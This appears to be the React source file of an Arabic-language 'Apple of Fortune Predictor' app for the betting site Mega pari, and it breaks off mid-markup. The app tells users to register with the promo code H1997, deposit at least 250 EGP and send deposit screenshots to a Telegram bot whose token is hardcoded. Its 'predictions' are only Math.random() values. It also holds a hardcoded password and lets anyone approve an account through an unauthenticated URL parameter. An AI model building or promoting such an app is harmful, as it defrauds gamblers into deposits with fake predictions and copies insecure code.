/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect } from "react";
import { motion, AnimatePresence } from "motion/react";
import { 
  AlertCircle, 
  ArrowRight, 
  CheckCircle2, 
  ChevronDown, 
  Cpu, 
  Globe, 
  Key, 
  Lock, 
  RefreshCcw, 
  ShieldCheck, 
  Terminal,
  Zap,
  Copy,
  Check,
  X,
  User,
  Image as ImageIcon,
  Send,
  Upload
} from "lucide-react";

// Telegram Configuration
const TELEGRAM_BOT_TOKEN = "8735957617:AAEQRHa5SfjEtGeD2mMzDK0qgM3-xxc8Ip4";
const TELEGRAM_CHAT_ID = "8493664873";

// Firebase Imports
import { auth, db, storage } from "./lib/firebase";
import { signInAnonymously } from "firebase/auth";
import { 
  doc, 
  setDoc, 
  getDoc, 
  updateDoc, 
  serverTimestamp, 
  collection,
  addDoc,
  onSnapshot
} from "firebase/firestore";

import { 
  Card, 
  CardContent, 
  CardDescription, 
  CardFooter, 
  CardHeader, 
  CardTitle 
} from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { Badge } from "@/components/ui/badge";
import { Separator } from "@/components/ui/separator";

export default function App() {
  const [view, setView] = useState<"splash" | "login" | "activate" | "server-auth" | "game" | "approve" | "reject">("splash");
  const [urlParams, setUrlParams] = useState(new URLSearchParams(window.location.search));
  
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const pathname = window.location.pathname;
    
    if (params.has("approve")) {
      setView("approve");
    } else if (params.has("reject")) {
      setView("reject");
    } else if (pathname.includes("login.html")) {
      setView("login");
    } else if (pathname.includes("activate.html")) {
      setView("activate");
    }
  }, []);
  const [platform, setPlatform] = useState<string>("goobet");
  const [platformIcons, setPlatformIcons] = useState<Record<string, string>>({
    "goobet": "/input_file_0.png"
  });

  // Try to load icons from Firebase Storage
  useEffect(() => {
    const loadIcons = async () => {
      const { getDownloadURL, ref: sRef } = await import("firebase/storage");
      const storageSync = [
        { id: "goobet", path: "icons/goobet.png" },
        { id: "avatar", path: "images/avatar.png" }
      ];

      for (const item of storageSync) {
        try {
          const url = await getDownloadURL(sRef(storage, item.path));
          if (item.id === "avatar") {
            // Update avatar logic if needed
          } else {
            setPlatformIcons(prev => ({ ...prev, [item.id]: url }));
          }
        } catch (e) {
          // Ignore if not in storage yet
        }
      }
    };
    loadIcons();
  }, []);

  const platforms = [
    { id: "Mega pari", name: "Mega pari", icon: platformIcons["Mega pari"], recommended: true },
  ];
  const [promoCode, setPromoCode] = useState<string>("H1997");
  const [connectionStep, setConnectionStep] = useState(0);
  const [connectionProgress, setConnectionProgress] = useState(0);
  const [copied, setCopied] = useState(false);
  
  const [accountID, setAccountID] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState<string | null>(null);

  // Activation state
  const [activateID, setActivateID] = useState("");
  const [screenshots, setScreenshots] = useState<File[]>([]);
  const [previewUrls, setPreviewUrls] = useState<string[]>([]);
  const [activateLoading, setActivateLoading] = useState(false);
  const [activateSuccess, setActivateSuccess] = useState(false);
  const [activateError, setActivateError] = useState("");
  const [activateStatus, setActivateStatus] = useState<"none" | "pending" | "approved" | "rejected">("none");

  // Manage preview URLs to prevent flickering/breaking
  useEffect(() => {
    const urls = screenshots.map(file => URL.createObjectURL(file));
    setPreviewUrls(urls);
    return () => urls.forEach(url => URL.revokeObjectURL(url));
  }, [screenshots]);

  // Approve state
  const [approveStatus, setApproveStatus] = useState<"loading" | "success" | "error" | "exists">("loading");
  const [approveMessage, setApproveMessage] = useState("");

  // Game specific state
  const [predictions, setPredictions] = useState<any[]>([]);
  const [hasRevealed, setHasRevealed] = useState(false);
  const [isPredicting, setIsPredicting] = useState(false);
  const [debugInfo, setDebugInfo] = useState<string>("Initializing...");

  // Firebase integration for anonymous auth
  useEffect(() => {
    signInAnonymously(auth)
      .then(() => setDebugInfo("Auth OK"))
      .catch(err => {
      if (err.code === 'auth/admin-restricted-operation') {
        setDebugInfo("Auth Disabled");
        console.warn("Firebase Anonymous Auth is disabled. Please enable it in the Firebase Console -> Authentication -> Sign-in method.");
      } else {
        setDebugInfo("Auth Failed: " + err.message);
        console.warn("Firebase auth failed:", err);
      }
    });

    // Real-time synchronization for predictions (Firestore version)
    const predictionRef = doc(db, 'predictions', 'active');
    
    const unsubscribe = onSnapshot(predictionRef, (snapshot) => {
      if (snapshot.exists()) {
        const data = snapshot.data();
        setDebugInfo("Got Data from Firestore");
        if (data.data) {
          setPredictions(data.data);
        }
      } else {
        setDebugInfo("Predictions not found");
      }
    }, (error) => {
      handleFirestoreError(error, OperationType.GET, 'predictions/active');
    });

    return () => unsubscribe();
  }, []);

  enum OperationType {
    CREATE = 'create',
    UPDATE = 'update',
    DELETE = 'delete',
    LIST = 'list',
    GET = 'get',
    WRITE = 'write',
  }

  interface FirestoreErrorInfo {
    error: string;
    operationType: OperationType;
    path: string | null;
    authInfo: {
      userId?: string | null;
      email?: string | null;
      emailVerified?: boolean | null;
    }
  }

  function handleFirestoreError(error: unknown, operationType: OperationType, path: string | null) {
    const errInfo: FirestoreErrorInfo = {
      error: error instanceof Error ? error.message : String(error),
      authInfo: {
        userId: auth.currentUser?.uid,
        email: auth.currentUser?.email,
        emailVerified: auth.currentUser?.emailVerified,
      },
      operationType,
      path
    };
    console.error('Firestore Error: ', JSON.stringify(errInfo));
    throw new Error(JSON.stringify(errInfo));
  }

  useEffect(() => {
    if (view === "approve") {
      const id = urlParams.get("approve");
      if (!id || !/^\d{10}$/.test(id)) {
        setApproveStatus("error");
        setApproveMessage("ID غير صالح. يجب أن يتكون من 10 أرقام.");
        return;
      }

      const approveAccount = async () => {
        try {
          const userRef = doc(db, 'users', id);
          const snapshot = await getDoc(userRef);
          
          if (snapshot.exists() && snapshot.data().status === 'approved') {
            setApproveStatus("exists");
            setApproveMessage("هذا الحساب تم تفعيله مسبقاً.");
            return;
          }
          
          await setDoc(userRef, {
            accountID: id,
            status: 'approved',
            updatedAt: serverTimestamp()
          }, { merge: true });
          
          setApproveStatus("success");
          setApproveMessage("✅ تم تفعيل الحساب بنجاح");
        } catch (e) {
          handleFirestoreError(e, OperationType.WRITE, `users/${id}`);
        }
      };

      approveAccount();
    } else if (view === "reject") {
      const id = urlParams.get("reject");
      if (!id || !/^\d{10}$/.test(id)) {
        // Just ignore if invalid
        return;
      }
      
      const rejectAccount = async () => {
        try {
          const userRef = doc(db, 'users', id);
          await setDoc(userRef, {
            accountID: id,
            status: 'rejected',
            updatedAt: serverTimestamp()
          }, { merge: true });
        } catch (e) {
          handleFirestoreError(e, OperationType.WRITE, `users/${id}`);
        }
      };

      rejectAccount();
    }
  }, [view, urlParams]);

  useEffect(() => {
    if (view === "server-auth") {
      setConnectionProgress(0);
      const interval = setInterval(() => {
        setConnectionProgress(prev => {
          if (prev >= 100) {
            clearInterval(interval);
            setTimeout(() => setView("game"), 500);
            return 100;
          }
          return prev + 1;
        });
      }, 40); // 4 seconds total

      return () => clearInterval(interval);
    }
  }, [view]);

  const handleStart = () => setView("login");
  
  const handleLogin = async () => {
    setError(null);
    if (!accountID || accountID.length < 5) {
      setError("يرجى إدخال رقم حساب صحيح");
      return;
    }
    if (password !== "H1997") {
      setError("كلمة المرور غير صحيحة");
      return;
    }

    try {
      const userRef = doc(db, 'users', accountID);
      const snapshot = await getDoc(userRef);

      if (snapshot.exists() && snapshot.data().status === 'approved') {
        setView("server-auth");
      } else {
        setError("الحساب غير مفعل ❌");
      }
    } catch (err) {
      handleFirestoreError(err, OperationType.GET, `users/${accountID}`);
    }
  };

  useEffect(() => {
    if (view === "activate") {
      const savedID = localStorage.getItem('pendingActivationID');
      if (savedID) {
        setActivateID(savedID);
        setActivateStatus("pending");
        // Check DB for status
        const checkStatus = async () => {
          try {
            const userRef = doc(db, 'users', savedID);
            const snapshot = await getDoc(userRef);
            if (snapshot.exists()) {
              const val = snapshot.data();
              if (val.status === 'approved') {
                setActivateStatus("approved");
              } else if (val.status === 'rejected') {
                setActivateStatus("rejected");
              }
            }
          } catch (error) {
             handleFirestoreError(error, OperationType.GET, `users/${savedID}`);
          }
        };
        checkStatus();
      } else {
        setActivateStatus("none");
      }
    }
  }, [view]);

  const handleActivateSubmit = async () => {
    if (!activateID || activateID.length === 0) {
      setActivateError("يرجى إدخال ID الحساب");
      return;
    }
    if (screenshots.length === 0) {
      setActivateError("يرجى رفع صورة الإثبات (صورة واحدة على الأقل)");
      return;
    }

    if (!auth.currentUser) {
      setActivateError("فشل الاتصال الآمن بالسيرفر. يرجى إعادة تحميل الصفحة.");
      return;
    }

    setActivateLoading(true);
    setActivateError("");
    
    try {
      const baseUrl = window.location.origin;
      const cleanToken = TELEGRAM_BOT_TOKEN.trim();
      const cleanChatId = TELEGRAM_CHAT_ID.trim();
      
      const uploadPromises = screenshots.map(async (file, i) => {
        const formData = new FormData();
        formData.append('chat_id', cleanChatId);
        formData.append('photo', file);

        if (i === screenshots.length - 1) {
          const caption = `🚀 طلب تفعيل جديد\n\n🆔 الرقم التعريفي: ${activateID}\n👤 المستخدم: ${auth.currentUser?.uid.slice(0, 8)}\n📅 التاريخ: ${new Date().toLocaleString('ar-EG')}`;
          formData.append('caption', caption);
          
          const replyMarkup = JSON.stringify({
            inline_keyboard: [
              [
                { text: "✅ موافقة وتفعيل", url: `${baseUrl}/?approve=${activateID}` },
              ],
              [
                { text: "❌ رفض الطلب", url: `${baseUrl}/?reject=${activateID}` }
              ]
            ]
          });
          formData.append('reply_markup', replyMarkup);
        }

        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 60000); // 60s timeout

        try {
          const response = await fetch(`https://api.telegram.org/bot${cleanToken}/sendPhoto`, {
            method: 'POST',
            body: formData,
            signal: controller.signal
          });
          clearTimeout(timeoutId);

          if (!response.ok) {
            const errorData = await response.json();
            throw new Error(errorData.description || "فشل إرسال الصورة");
          }
        } catch (fetchErr: any) {
          clearTimeout(timeoutId);
          if (fetchErr.name === 'AbortError') {
            throw new Error("تأخر الرد من السيرفر، يرجى المحاولة مرة أخرى.");
          }
          throw fetchErr;
        }
      });

      await Promise.all(uploadPromises);
      setActivateSuccess(true);
      localStorage.setItem('pendingActivationID', activateID);
      
      try {
        if (auth.currentUser) {
          const userRef = doc(db, 'users', activateID);
          await setDoc(userRef, {
            accountID: activateID,
            userId: auth.currentUser.uid,
            status: 'pending',
            updatedAt: serverTimestamp()
          }, { merge: true });
        }
      } catch (dbErr: any) {
        console.error("Firestore error:", dbErr);
      }
      
      setActivateStatus("pending");
    } catch (error: any) {
      console.error("Activation flow error:", error);
      setActivateError(error.message || "حدث خطأ أثناء الإرسال. تأكد من اتصالك بالإنترنت وحجم الصور.");
    } finally {
      setActivateLoading(false);
    }
  };

  const retryActivation = () => {
    localStorage.removeItem('pendingActivationID');
    setActivateID("");
    setScreenshots([]);
    setActivateSuccess(false);
    setActivateStatus("none");
  };

  const handleAccountIDChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, ""); // Only allow digits
    if (value.length <= 10) {
      setAccountID(value);
    }
  };

  const generatePredictions = async () => {
    setIsPredicting(true);
    setHasRevealed(false);
    
    // إنشاء التوقعات بالشكل القديم m1 إلى m50
    const finalObject: Record<string, any> = {};
    for (let r = 0; r < 10; r++) {
      let safeCount = 4;
      if (r >= 4 && r < 7) safeCount = 3;
      else if (r >= 7 && r < 9) safeCount = 2;
      else if (r >= 9) safeCount = 1;

      const safeCols: number[] = [];
      while (safeCols.length < safeCount) {
        const c = Math.floor(Math.random() * 5);
        if (!safeCols.includes(c)) {
          safeCols.push(c);
        }
      }

      for (let c = 0; c < 5; c++) {
        const mIndex = r * 5 + c + 1;
        const value = safeCols.includes(c) ? "1" : "0";
        finalObject[`m${mIndex}`] = { [`m${mIndex}`]: value };
      }
    }

    try {
      // 1. Write to Firestore (for this web app and logs)
      await setDoc(doc(db, 'predictions', 'active'), {
        data: finalObject,
        updatedAt: serverTimestamp()
      });

      // 2. Write to Realtime Database (to m11 path for external android/scripts)
      // Import rtdb from firebase lib
      const { rtdb } = await import("./lib/firebase");
      const { ref: rRef, set: rSet } = await import("firebase/database");
      try {
        await rSet(rRef(rtdb, 'm11'), finalObject);
      } catch (rtdbErr) {
        console.warn("RTDB Sync failed, but Firestore worked:", rtdbErr);
      }

      setDebugInfo("تم إرسال التوقع بنجاح (Firestore + RTDB)!");
    } catch (err: any) {
      handleFirestoreError(err, OperationType.WRITE, 'predictions/active');
    }

    // تعيين البيانات محلياً أيضاً
    setPredictions(finalObject as any);

    // محاكاة تأثير ظهور التوقعات
    setTimeout(() => {
      setIsPredicting(false);
      setHasRevealed(true);
    }, 2500);
  };

  const resetGame = () => {
    setHasRevealed(false);
  };

  const copyPromo = () => {
    navigator.clipboard.writeText(promoCode);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const isSafeApple = (rIdx: number, cIdx: number) => {
    if (!predictions) return false;
    
    // Calculate the mIndex (1 to 50)
    const mIndex = rIdx * 5 + cIdx + 1;
    const mKey = `m${mIndex}`;
    
    const mObj = (predictions as any)[mKey];
    if (mObj && typeof mObj === 'object' && mObj[mKey] === "1") {
      return true;
    }
    
    return false;
  };

  return (
    <div className="min-h-screen bg-[#090b14] text-white font-sans selection:bg-cyan-500 selection:text-black flex flex-col items-center justify-start overflow-x-hidden relative" dir="rtl">
      {/* Background Gradients */}
      <div className="fixed inset-0 overflow-hidden pointer-events-none z-0">
        <div className="absolute top-[-10%] left-[-10%] w-[60%] h-[60%] bg-blue-600/10 rounded-full blur-[120px]" />
        <div className="absolute bottom-[-10%] right-[-10%] w-[60%] h-[60%] bg-cyan-600/10 rounded-full blur-[120px]" />
      </div>

      {/* Splash Modal Overlay */}
      <AnimatePresence>
        {view === "splash" && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/80 backdrop-blur-md"
          >
            <motion.div
              initial={{ scale: 0.9, opacity: 0, y: 20 }}
              animate={{ scale: 1, opacity: 1, y: 0 }}
              exit={{ scale: 0.9, opacity: 0, y: 20 }}
              className="relative w-full max-w-md bg-[#0d121d] rounded-[2.5rem] border border-white/5 shadow-2xl overflow-hidden"
            >
              {/* Top accent line */}
              <div className="absolute top-0 inset-x-12 h-[2px] bg-gradient-to-r from-transparent via-cyan-400 to-transparent" />
              <div className="absolute bottom-0 inset-x-12 h-[2px] bg-gradient-to-r from-transparent via-cyan-400 to-transparent" />

              {/* Close Button */}
              <Button
                size="icon"
                variant="ghost"
                onClick={handleStart}
                className="absolute top-6 left-6 w-10 h-10 rounded-full bg-white/5 hover:bg-white/10 text-white/50 hover:text-white z-20"
              >
                <X className="w-5 h-5" /> 
              </Button>

              <div className="p-8 pt-12 text-center space-y-8">
                {/* Logo Section */}
                <div className="mx-auto w-32 h-32 relative">
                  <div className="w-full h-full bg-white/5 border border-white/10 rounded-full flex items-center justify-center shadow-2xl overflow-hidden">
                    <motion.div 
                      animate={{ scale: [1, 1.05, 1] }} 
                      transition={{ duration: 4, repeat: Infinity }}
                      className="w-full h-full"
                    >
                      <img src="/input_file_2.png" alt="Crazy VIP Logo" className="w-full h-full object-cover" />
                    </motion.div>
                  </div>
                  <div className="absolute bottom-0 right-0 bg-amber-500 text-[10px] font-black text-black px-3 py-1 rounded-full border-2 border-[#0d121d] z-10">
                    PREMIUM V1
                  </div>
                </div>

                <div className="space-y-4">
                  <h2 className="text-4xl font-black tracking-tighter text-white">DOCOTOR VIP</h2>
                  <p className="text-cyan-400 text-sm font-black tracking-[0.2em] uppercase">Apple of Fortune Predictor</p>
                </div>

                {/* Instructions List */}
                <div className="bg-black/40 rounded-3xl p-6 border border-white/5 space-y-5 text-right">
                  <div className="flex items-center justify-between gap-4">
                    <div className="w-2.5 h-2.5 rounded-full bg-green-500 shadow-[0_0_10px_rgba(34,197,94,0.5)]" />
                    <p className="text-sm font-bold flex-1 text-white/80">استخدم <span className="text-white">حساباً جديداً</span> لم يُستخدم من قبل</p>
                  </div>
                  <div className="flex items-center justify-between gap-4">
                    <div className="w-2.5 h-2.5 rounded-full bg-amber-500 shadow-[0_0_10px_rgba(245,158,11,0.5)]" />
                    <p className="text-sm font-bold flex-1 text-white/80">الحد الأدنى للإيداع: <span className="text-white">250 جنيه</span> فقط</p>
                  </div>
                  <div className="flex items-center justify-between gap-4">
                    <div className="w-2.5 h-2.5 rounded-full bg-blue-500 shadow-[0_0_10px_rgba(59,130,246,0.5)]" />
                    <p className="text-sm font-bold flex-1 text-white/80">أدخل البروموكود أدناه عند التسجيل</p>
                  </div>
                </div>

                {/* Promo Box */}
                <div className="bg-[#151c2c] rounded-2xl p-4 border border-blue-500/10 flex items-center justify-between group">
                  <div className="text-right">
                    <div className="text-[10px] font-bold text-muted-foreground uppercase mb-1">البروموكود الحصري</div>
                    <div className="text-2xl font-mono font-black tracking-widest text-[#40C4FF]">{promoCode}</div>
                  </div>
                  <Button 
                    onClick={copyPromo}
                    className="bg-cyan-500 hover:bg-cyan-400 text-black font-black px-8 h-12 shadow-[0_0_20px_rgba(6,182,212,0.2)] rounded-xl group-hover:scale-105 transition-transform"
                  >
                    {copied ? <Check className="w-5 h-5" /> : "نسخ"}
                  </Button>
                </div>

                <div className="flex flex-col gap-3">
                  <Button 
                    onClick={handleStart}
                    className="w-full h-16 bg-[#3b82f6] hover:bg-[#2563eb] text-white text-xl font-black rounded-2xl shadow-[0_8px_30px_rgb(59,130,246,0.3)] active:scale-[0.98] transition-all"
                  >
                    ابدأ الآن
                  </Button>
                </div>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      <div className="w-full max-w-[420px] min-h-screen flex flex-col z-10 px-4 sm:px-0 py-8 relative space-y-8">
        {/* Mobile border effect on desktop */}
        <div className="hidden sm:block absolute inset-y-0 -left-px -right-px border-x border-white/5 pointer-events-none z-[-1]" />

        {view === "activate" && (
          <motion.div
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            className="flex flex-col items-center gap-8 px-4"
          >
            <div className="w-full max-w-md bg-[#111726]/80 border border-white/5 rounded-[2.5rem] p-8 space-y-8 backdrop-blur-xl shadow-[0_20px_50px_rgba(0,0,0,0.5)] relative">
              <Button
                size="icon"
                variant="ghost"
                onClick={() => setView("splash")}
                className="absolute top-6 left-6 w-10 h-10 rounded-full bg-white/5 hover:bg-white/10 text-white/50 hover:text-white z-20"
              >
                <X className="w-5 h-5" /> 
              </Button>
              
              <div className="text-center space-y-2 mt-4">
                 <h1 className="text-3xl font-black tracking-tight text-white mb-2">تفعيل <span className="text-cyan-400 font-black">حسابك</span></h1>
                 <p className="text-muted-foreground text-sm font-medium">أرسل صورة الإثبات لتفعيل حسابك على السيرفر</p>
              </div>

              {activateStatus === "approved" ? (
                <motion.div 
                  initial={{ opacity: 0, y: 10 }}
                  animate={{ opacity: 1, y: 0 }}
                  className="bg-green-500/10 border border-green-500/20 rounded-2xl p-8 flex flex-col items-center text-center gap-4"
                >
                  <div className="w-16 h-16 bg-green-500/20 rounded-full flex items-center justify-center">
                    <CheckCircle2 className="w-8 h-8 text-green-400" />
                  </div>
                  <h3 className="text-xl font-black text-green-400">تم قبول حسابك بنجاح ✅</h3>
                  <p className="text-white/60 text-sm">يمكنك الآن تسجيل الدخول إلى النظام باستخدام حسابك.</p>
                  <Button 
                    onClick={() => {
                        setView("login");
                        setAccountID(activateID); // Pre-fill
                    }}
                    className="w-full mt-4 h-12 bg-green-500 hover:bg-green-600 text-white font-bold rounded-xl"
                  >
                    تسجيل الدخول
                  </Button>
                </motion.div>
              ) : activateStatus === "rejected" ? (
                <motion.div 
                  initial={{ opacity: 0, y: 10 }}
                  animate={{ opacity: 1, y: 0 }}
                  className="bg-red-500/10 border border-red-500/20 rounded-2xl p-8 flex flex-col items-center text-center gap-4"
                >
                  <div className="w-16 h-16 bg-red-500/20 rounded-full flex items-center justify-center">
                    <X className="w-8 h-8 text-red-500" />
                  </div>
                  <h3 className="text-xl font-black text-red-500">تم رفض حسابك ❌</h3>
                  <p className="text-white/60 text-sm">تم رفض حسابك بسبب التزييف في البيانات أو إرسال بيانات غير صحيحة.</p>
                  <Button 
                    onClick={retryActivation}
                    className="w-full mt-4 h-12 bg-white/10 hover:bg-white/20 text-white font-bold rounded-xl"
                  >
                    إعادة تقديم الطلب
                  </Button>
                </motion.div>
              ) : activateStatus === "pending" || activateSuccess ? (
                <motion.div 
                  initial={{ opacity: 0, y: 10 }}
                  animate={{ opacity: 1, y: 0 }}
                  className="bg-blue-500/10 border border-blue-500/20 rounded-2xl p-8 flex flex-col items-center text-center gap-4"
                >
                  <div className="w-16 h-16 bg-blue-500/20 rounded-full flex items-center justify-center">
                    <CheckCircle2 className="w-8 h-8 text-blue-400" />
                  </div>
                  <h3 className="text-xl font-black text-blue-400">تم إرسال طلبك للمراجعة ✅</h3>
                  <p className="text-white/60 text-sm">سيتم تفعيل حسابك قريباً. يرجى الانتظار والمحاولة لاحقاً بتسجيل الدخول.</p>
                  <Button 
                    onClick={() => setView("splash")}
                    className="w-full mt-4 h-12 bg-white/10 hover:bg-white/20 text-white font-bold rounded-xl"
                  >
                    عودة للرئيسية
                  </Button>
                </motion.div>
              ) : (
                <div className="space-y-6">
                  <div className="bg-cyan-950/30 border border-cyan-500/20 p-4 rounded-2xl text-right space-y-2">
                    <h4 className="font-bold text-cyan-400 mb-2">شروط التفعيل:</h4>
                    <ul className="text-sm text-cyan-100/70 space-y-1 list-disc list-inside">
                      <li>تنزيل المنصة المراد اللعب فيها</li>
                      <li>عمل حساب في المنصة بالبروموكود <span className="text-white font-bold bg-cyan-900/50 px-1 rounded">H1997</span></li>
                      <li>عمل إيداع بمبلغ لا يقل عن 250 جنيه فقط</li>
                    </ul>
                  </div>

                  <div className="space-y-4">
                     <div className="relative group">
                       <User className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-muted-foreground group-focus-within:text-cyan-400 transition-colors" />
                       <Input 
                         placeholder="الحساب ID (أي عدد من الأرقام)"
                         type="text"
                         inputMode="numeric"
                         value={activateID}
                         onChange={(e) => {
                           const val = e.target.value.replace(/\D/g, "");
                           if (val.length <= 10) setActivateID(val);
                         }}
                         className="bg-black/40 border-white/5 h-16 pr-12 text-right font-bold text-lg rounded-2xl focus:border-cyan-500/50 focus:ring-0 transition-all placeholder:text-muted-foreground/30"
                       />
                     </div>
                     
                     <div className="relative">
                        <input 
                          type="file" 
                          id="screenshot-upload" 
                          accept="image/*" 
                          multiple
                          className="hidden" 
                          onChange={(e) => {
                            if (e.target.files && e.target.files.length > 0) {
                              setScreenshots(Array.from(e.target.files));
                            }
                          }}
                        />
                        <label 
                          htmlFor="screenshot-upload"
                          className="flex flex-col items-center justify-center w-full h-32 bg-black/40 border-2 border-dashed border-white/10 rounded-2xl cursor-pointer hover:border-cyan-500/50 transition-colors group relative overflow-hidden"
                        >
                          {previewUrls.length > 0 ? (
                            <div className="absolute inset-0 w-full h-full flex flex-col items-center justify-center bg-black/60">
                              <div className="flex -space-x-4 mb-2">
                                {previewUrls.slice(0, 3).map((url, idx) => (
                                  <img key={idx} src={url} alt="Preview" className="w-12 h-12 rounded-full object-cover border-2 border-cyan-500 relative" style={{ zIndex: 3 - idx }} />
                                ))}
                                {previewUrls.length > 3 && (
                                  <div className="w-12 h-12 rounded-full bg-black/80 text-white flex items-center justify-center font-bold text-sm border-2 border-cyan-500 relative z-0">
                                    +{previewUrls.length - 3}
                                  </div>
                                )}
                              </div>
                              <span className="text-white text-xs font-bold drop-shadow-md">تم تحديد {previewUrls.length} صور</span>
                              <div className="absolute inset-0 flex flex-col items-center justify-center bg-black/70 opacity-0 group-hover:opacity-100 transition-opacity">
                                <ImageIcon className="w-8 h-8 text-white mb-2" />
                                <span className="text-white font-bold">تغيير الصور</span>
                              </div>
                            </div>
                          ) : (
                            <div className="flex flex-col items-center justify-center pt-5 pb-6">
                              <Upload className="w-8 h-8 text-muted-foreground group-hover:text-cyan-400 mb-2 transition-colors" />
                              <p className="text-sm font-bold text-white/50 group-hover:text-white/80">اضغط لرفع صور إثبات الإيداع</p>
                              <p className="text-xs text-muted-foreground mt-1 text-center">يمكنك تحديد أكثر من صورة واحدة</p>
                            </div>
                          )}
                        </label>
                     </div>

                     {activateError && (
                       <motion.p 
                         initial={{ opacity: 0, x: 10 }}
                         animate={{ opacity: 1, x: 0 }}
                         className="text-red-500 text-xs font-bold text-center bg-red-500/10 p-2 rounded-lg border border-red-500/20"
                       >
                         {activateError}
                       </motion.p>
                     )}
                  </div>

                  <Button 
                   onClick={handleActivateSubmit}
                   disabled={activateLoading}
                   className="w-full h-16 bg-gradient-to-r from-blue-600 to-cyan-500 hover:from-blue-500 hover:to-cyan-400 text-white text-xl font-black rounded-2xl shadow-2xl shadow-cyan-600/20 active:scale-[0.98] transition-all flex items-center justify-center gap-2"
                  >
                    {activateLoading ? (
                      <span className="flex items-center gap-2 animate-pulse">
                         جاري الإرسال...
                      </span>
                    ) : (
                      <>
                        <Send className="w-5 h-5" />
                        إرسال الطلب
                      </>
                    )}
                  </Button>
                </div>
              )}
            </div>
          </motion.div>
        )}

        {view === "login" && (
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="flex flex-col items-center gap-8"
          >
            {/* Avatar Section */}
            <div className="relative">
              {/* Animated Rings */}
              <motion.div 
                animate={{ rotate: 360 }}
                transition={{ duration: 10, repeat: Infinity, ease: "linear" }}
                className="absolute inset-[-20px] rounded-full border-2 border-dashed border-cyan-500/20"
              />
              <motion.div 
                animate={{ rotate: -360 }}
                transition={{ duration: 15, repeat: Infinity, ease: "linear" }}
                className="absolute inset-[-10px] rounded-full border-2 border-cyan-500/40 border-t-cyan-500 border-l-transparent border-r-transparent border-b-transparent"
              />
              
              <div className="w-32 h-32 rounded-full overflow-hidden border-4 border-[#1c2230] shadow-2xl relative z-10 bg-[#0d121d] flex items-center justify-center">
                <img 
                  src="/input_file_2.png" 
                  alt="Avatar" 
                  className="w-full h-full object-cover"
                />
                <div className="absolute inset-0 bg-gradient-to-t from-cyan-900/40 to-transparent pointer-events-none" />
              </div>
            </div>

            {/* Login Form Container */}
            <div className="w-full bg-[#111726]/80 border border-white/5 rounded-[2.5rem] p-8 space-y-8 backdrop-blur-xl shadow-[0_20px_50px_rgba(0,0,0,0.5)]">
               <div className="text-center space-y-2">
                  <h1 className="text-4xl font-black tracking-tight text-white">تسجيل <span className="text-cyan-400 font-black">الدخول</span></h1>
                  <p className="text-muted-foreground text-sm font-medium">أدخل بياناتك للوصول إلى النظام</p>
               </div>

               <div className="space-y-4">
                  <div className="relative group">
                    <User className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-muted-foreground group-focus-within:text-cyan-400 transition-colors" />
                    <Input 
                      placeholder="الحساب ID"
                      type="text"
                      inputMode="numeric"
                      value={accountID}
                      onChange={handleAccountIDChange}
                      className="bg-black/40 border-white/5 h-16 pr-12 text-right font-bold text-lg rounded-2xl focus:border-cyan-500/50 focus:ring-0 transition-all placeholder:text-muted-foreground/30"
                    />
                  </div>
                  <div className="relative group">
                    <Lock className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-muted-foreground group-focus-within:text-cyan-400 transition-colors" />
                    <Input 
                      type="password"
                      placeholder="كلمة المرور"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      className="bg-black/40 border-white/5 h-16 pr-12 text-right font-bold text-lg rounded-2xl focus:border-cyan-500/50 focus:ring-0 transition-all placeholder:text-muted-foreground/30"
                    />
                  </div>
                  {error && (
                    <motion.p 
                      initial={{ opacity: 0, x: 10 }}
                      animate={{ opacity: 1, x: 0 }}
                      className="text-red-500 text-xs font-bold text-center bg-red-500/10 p-2 rounded-lg border border-red-500/20"
                    >
                      {error}
                    </motion.p>
                  )}
               </div>

               <div className="space-y-4">
                  <div className="flex items-center justify-between px-1">
                    <div className="w-1.5 h-1.5 rounded-full bg-blue-500" />
                    <span className="text-xs font-bold text-muted-foreground uppercase">اختر المنصة</span>
                  </div>
                  
                  <div className="grid grid-cols-2 gap-3">
                    {platforms.map((p) => (
                      <button
                        key={p.id}
                        onClick={() => setPlatform(p.id)}
                        className={`relative rounded-3xl p-4 flex flex-col items-center gap-3 transition-all border-2 border-transparent ${
                          platform === p.id 
                            ? "bg-cyan-500/10 border-cyan-500/50 shadow-[0_0_15px_rgba(6,182,212,0.15)]" 
                            : "bg-black/40 border-white/5 hover:bg-black/60"
                        }`}
                      >
                        {p.recommended && (
                          <div className="absolute -top-3 inset-x-0 mx-auto w-fit bg-amber-500 text-[9px] font-black text-black px-2 py-0.5 rounded-full whitespace-nowrap">
                            ينصح به 🔥
                          </div>
                        )}
                        <div className="w-12 h-12 rounded-2xl bg-white/5 p-1 flex items-center justify-center overflow-hidden">
                          <img src={p.icon} alt={p.name} className="w-full h-full object-cover" />
                        </div>
                        <span className="text-[10px] font-black uppercase tracking-wider">{p.name}</span>
                      </button>
                    ))}
                  </div>
               </div>

               <div className="flex flex-col gap-3">
                 <Button 
                  onClick={handleLogin}
                  className="w-full h-16 bg-gradient-to-r from-blue-600 to-cyan-500 hover:from-blue-500 hover:to-cyan-400 text-white text-xl font-black rounded-2xl shadow-2xl shadow-cyan-600/20 active:scale-[0.98] transition-all"
                 >
                   دخول إلى النظام
                 </Button>
                 <Button 
